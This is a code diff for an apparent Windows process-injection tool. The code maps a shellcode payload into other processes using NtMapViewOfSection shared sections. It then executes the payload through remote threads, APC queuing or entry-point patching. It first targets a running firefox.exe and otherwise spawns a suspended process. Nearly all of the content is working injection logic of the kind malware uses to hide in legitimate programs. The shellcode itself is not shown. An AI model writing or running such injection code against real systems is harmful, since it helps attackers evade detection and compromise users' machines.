@@ -1,43 +1,20 @@
 #include <Windows.h>
 #include <iostream>
 
+
 #include "main.h"
+#include "createproc.h"
+#include "enumproc.h"
+
 #include "payload.h"
 
-#define ADD_THREAD
-//#define ADD_APC
-//#define PATCH_EP
+#define ADD_THREAD  0
+#define ADD_APC 1
+#define PATCH_EP 2
 
 using namespace std;
 
-bool get_default_browser(LPWSTR lpwOutPath, DWORD szOutPath)
-{
-    HKEY phkResult;
-    DWORD iMaxLen = szOutPath;
-
-    LSTATUS res = RegOpenKeyEx(HKEY_CLASSES_ROOT, L"HTTP\\shell\\open\\command", 0, 1u, &phkResult);
-    if (res != ERROR_SUCCESS) {
-        cout << "Failed with value " << res << endl;
-        return false;
-    }
-
-    res = RegQueryValueEx(phkResult, NULL, NULL, NULL, (LPBYTE) lpwOutPath, (LPDWORD) &iMaxLen);
-    if (res != ERROR_SUCCESS) {
-        cout << "Failed with value " << res << endl;
-        return false;
-    }
-    wcout << lpwOutPath << endl;
-    return true;
-}
-
-bool get_calc_path(LPWSTR lpwOutPath, DWORD szOutPath)
-{
-    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
-    wcout << lpwOutPath << endl;
-    return true;
-}
-
-PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSize)
+PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
 {
     HANDLE hSection = NULL;
     OBJECT_ATTRIBUTES hAttributes;
@@ -59,7 +36,7 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSi
     SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
 
     // map the section in context of current process:
-    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
+    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
     {
         printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
         return NULL;
@@ -71,7 +48,7 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSi
 
     //map the new section into context of opened process
     PVOID sectionBaseAddress2 = NULL;
-    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
+    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
     {
         printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
         return NULL;
@@ -85,56 +62,66 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSi
     return sectionBaseAddress2;
 }
 
+bool inject_in_new_process(DWORD mode)
+{
+    PROCESS_INFORMATION pi;
+    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+    if (create_new_process2(pi) == false) {
+        return false;
+    }
+    LPVOID remote_shellcode_ptr = NULL;
+    switch (mode) {
+    case ADD_THREAD:
+        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+        run_shellcode_in_new_thread1(pi.hProcess, remote_shellcode_ptr);
+        // not neccessery to resume the main thread
+        break;
+    case ADD_APC:
+        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+        add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
+        ResumeThread(pi.hThread); //resume the main thread
+        break;
+    case PATCH_EP:
+        paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+        ResumeThread(pi.hThread); //resume the main thread
+        break;
+    }
+    //close handles
+    ZwClose(pi.hThread);
+    ZwClose(pi.hProcess);
+    return true;
+}
+
+bool inject_in_existing_process()
+{
+    HANDLE hProcess = find_running_process(L"firefox.exe");
+    LPVOID remote_shellcode_ptr = map_code_into_process(hProcess, g_Shellcode, sizeof(g_Shellcode));
+    if (remote_shellcode_ptr == NULL) {
+        return false;
+    }
+    run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
+    return true;
+}
+
 int main()
 {
-   if (load_undoc_ntdll_functions() == FALSE) {
+   if (load_ntdll_functions() == FALSE) {
+        printf("Failed to load NTDLL function\n");
+        return (-1);
+    }
+    if (load_kernel32_functions() == FALSE) {
         printf("Failed to load NTDLL function\n");
         return (-1);
     }
 
-    WCHAR lpwOutPath[MAX_PATH];
-    get_default_browser(lpwOutPath, MAX_PATH);
-
-    STARTUPINFO si;
-    memset(&si, 0, sizeof(STARTUPINFO));
-    si.cb = sizeof(STARTUPINFO);
-
-    PROCESS_INFORMATION pi;
-    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
-
-    if (!CreateProcess(
-            NULL,
-            lpwOutPath,
-            NULL, //lpProcessAttributes
-            NULL, //lpThreadAttributes
-            NULL, //bInheritHandles
-            DETACHED_PROCESS|CREATE_SUSPENDED|CREATE_NO_WINDOW, //dwCreationFlags
-            NULL, //lpEnvironment 
-            NULL, //lpCurrentDirectory
-            &si, //lpStartupInfo
-            &pi //lpProcessInformation
-        ))
-    {
-        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
-        return (-1);
+    if (inject_in_existing_process()) {
+        printf("[SUCCESS] Code injected in existing process!\n");
+    } else {
+        if (inject_in_new_process(ADD_THREAD)) {
+             printf("[SUCCESS] Code injected in a new process!\n");
+        }
     }
-
-#ifdef ADD_THREAD
-    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
-    run_shellcode_in_new_thread1(pi.hProcess, remote_shellcode_ptr);
-    ResumeThread(pi.hThread); //main Thread
-#elif ADD_APC
-    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
-    add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
-#elif PATCH_EP
-    paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
-    ResumeThread(pi.hThread); //main Thread
-#else
-    ResumeThread(pi.hThread); //main Thread
-#endif
-    //close handles
-    ZwClose(pi.hThread);
-    ZwClose(pi.hProcess);
+    Sleep(3000);
     TerminateProcess(GetCurrentProcess(), STATUS_SUCCESS);
     return 0;
 }
